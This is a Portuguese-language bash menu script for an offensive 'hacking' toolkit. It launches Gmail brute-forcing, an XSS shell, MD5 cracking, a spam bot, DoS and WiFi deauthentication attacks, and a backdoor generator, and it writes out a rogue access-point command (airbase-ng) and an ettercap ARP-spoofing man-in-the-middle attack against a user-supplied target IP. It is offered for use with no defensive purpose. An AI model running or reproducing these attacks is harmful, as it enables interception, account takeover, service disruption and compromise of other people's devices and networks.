#!/bin/bash

# Cores
end="\033[m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
cyan="\033[1;36m"
white="\033[1;37m"
purple="\033[1;35m"

clear

banner=$(bash requisitos/banner.sh)

echo "$banner"

sleep 0.10

sleep 0.1
printf "${purple}By: H7X\n"
sleep 0.1
printf "Versão: 3.9\n"
sleep 0.1
printf "Github: https://github.com/H7XX\n"
sleep 0.1
printf "Youtube: https://www.youtube.com/channel/UCKHc3Id634qWSrZ_vbQKGTQ\n ${end}"
sleep 0.1
echo " "
sleep 0.1
printf "${green}{0} sair do script				{8} Derrubar Wifi\n"
sleep 0.1
printf "{1} consultar cep                               {9} criar rede wifi fake\n"
sleep 0.1
printf "{2} Rastrear ip                                 {10} Criar backdoor automaticamente\n"
sleep 0.1
printf "{3} Brute force em email                        {11} arp spoofing (mitm)\n"
sleep 0.1
printf "{4} Shell em XSS                                {12} Consultar codigo de banco\n"
sleep 0.1
printf "{5} Descriptografar MD5                         {13} Consultar operadora de número\n"
sleep 0.1
printf "{6} Spam-Bot					{14} Consulta DDD\n"
sleep 0.1
printf "{7} Ataque D0S					{15} Atualizar script\n"
echo " "
read -p "Escolha uma opção >> " opcao

case "$opcao" in
	0)
		echo "tchau (^_^)／"
		exit 1
	;;

	1)
		figlet consulta_cep
		read -p "Cep que você deseja consultar: " cep
		curl https://viacep.com.br/ws/$cep/json/
	;;


	2)
		ipinfo=bash requisitos/ipinfo.sh
	;;

	3)
		brute=bash requisitos/brute-gmail.sh
	;;

	4)
		cd requisitos
		python3 shellxss.py
		cd ..
	;;

	5)
		echo "Essa descriptografia é feita com brute force"
		echo "Então não garanto que você ira conseguir descriptografar"
		echo "tenha uma Wordlist instalada"
		read -p "Hash: " hash
		read -p "caminho da wordlist: " word
		php requisitos/md5b.php -f $word -v $hash
	;;

	6)
		cd requisitos/
		python3 SpamBot.py
		cd ..
	;;

	7)
		DOS=bash requisitos/DosConfig.sh
	;;

	8)
		wifidos=bash requisitos/WifiDos.sh
	;;

	9)
		echo "Recomendo usar a interface wlan0mon"
		read -p "Sua Interface: " interface
		read -p "Canal onde sua rede vai ficar ospedada: " canal
		read -p "Nome da Rede: " Rede
		airbase-ng $interface -c $canal -e $Rede
	;;

	10)
		cd requisitos/creat-backdoor
		./back7.sh
	;;

	11)
mensagem="
esse ataque não funciona em sites com
proteção https"
		echo "$mensagem"
		read -p "Presione {Enter} para continuar"
		figlet arp_spoof
		read -p "Digite sua interface: " arpiface
		read -p "Digite o ip do alvo: " iparp
		clear
		cat requisitos/creat-backdoor/cat-ascii
		echo " "
		sleep 0.70
		echo "Iniciando ataque..."
		echo "precione {Ctrl c} para parar o ataque"
		ettercap -T -q -i $arpiface -P arp_spoof -M arp /$iparp//
	;;

	12)
		figlet consulta-banco
		read -p "Digite o codigo do banco:" codigo
		echo "Resultado:"
		curl https://brasilapi.com.br/api/banks/v1/$codigo
	;;

	13)
		perl requisitos/operadora.pl
	;;

	14)
		figlet Consulta-DDD
		read -p "Informe o DDD: " ddd
		wget https://brasilapi.com.br/api/ddd/v1/$ddd -O ddd.txt
		sed 's/,/\n  /g' ddd.txt | sed 's/:/: /g' | sed 's/"//g' | sed 's/{/\ \ /' | sed 's/}//' | sed 's/\[//' | sed 's/\]/\n/' | sed 's/state/estado/' | sed 's/cities/cidades/'
		rm ddd.txt
	;;

	15)
		clear
		cd requisitos/
		bash atualizar.sh
	;;

	*)
		echo -e "${red}[!]Opção invalida${end}"
		sleep 2
		bash Ghost007.sh
	;;

esac
